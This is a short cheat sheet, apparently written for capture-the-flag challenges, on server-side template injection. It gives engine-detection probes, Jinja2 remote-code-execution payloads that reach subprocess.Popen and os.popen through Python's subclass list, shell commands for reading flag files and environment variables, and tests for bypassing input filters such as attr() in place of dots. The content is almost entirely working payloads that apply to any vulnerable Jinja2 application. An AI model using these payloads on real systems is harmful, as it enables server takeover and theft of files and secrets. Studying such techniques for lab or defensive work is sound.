# Step 1: Detect the template engine
`{{7*7}}`                    // Jinja2 <br>
`${7*7}`                     // Velocity <br>
`<%= 7 * 7 %>`               // ERB <br>
`#{7*7}`                     // Jade / Pug <br>
`*{7*7}`                     // Thymeleaf <br>

# Step 2: Basic Jinja2 RCE Payload <br>
`{{ ''.__class__.__mro__[1].__subclasses__() }}` <br>
This will dump a list of all subclasses — look for something like <class 'subprocess.Popen'>, <class 'os._wrap_close'>, etc. <br>

# Step 3: Find the os or subprocess class index <br>
`{{ ''.__class__.__mro__[1].__subclasses__()[400] }}` <br>
Check for the Popen subprocess by iterating through 400, 401, etc. <br>

# Step 4: Execute Shell Command to Read Flag <br>
`{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('cat /flag.txt', shell=True, stdout=-1).communicate()[0].decode() }}`  //prints the content of flag.txt <br>
`{{ ''.__class__.__mro__[1].__subclasses__()[X]('ls', shell=True, stdout=-1).communicate()[0].decode() }}`     //ls is executed in the web server <br>


# Alternative via os.popen (if subprocess doesn't work) <br>
`{{ ''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].popen('cat /flag.txt').read() }}` <br>
`{{ ''.__class__.__mro__[1].__subclasses__()[Y].__init__.__globals__['os'].popen('ls').read() }}` <br>

# Common Commands to Try: <br>
`ls` / → to list root <br>
`ls /app`, `ls /home`, `ls /var/www/html` → common flag locations <br>
`cat /flag.txt` → direct flag access <br> 
`env` → might contain the flag in env vars <br>

more info on: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html

# Filter checking: <br>
1. Testing for dot (`.`) <br>
`{{7.__class__}}`  // Returns int class if dot is not filtered. <br> 

2.  Test for Underscore (`_`) <br>
`{{''.__class__}}` // Should return <class 'str'>. If it echoes as {{''class}}, then __ or _ is filtered or stripped. <br>

3. Test for Brackets (`[]`) <br> 
`{{['a','b'][0]}}` // Should return a if brackets are allowed. <br>

4. Test for quotes. <br>
`{{'a'}}` <br>
`{{"a"}}` // Check if quotes are blocked, stripped, or allowed. <br>

5. Test for `attr()` Filter (used to evade `.`) <br>
`{{''|attr('__class__')}}`  // If dot is blocked, this may succeed as a bypass. <br>

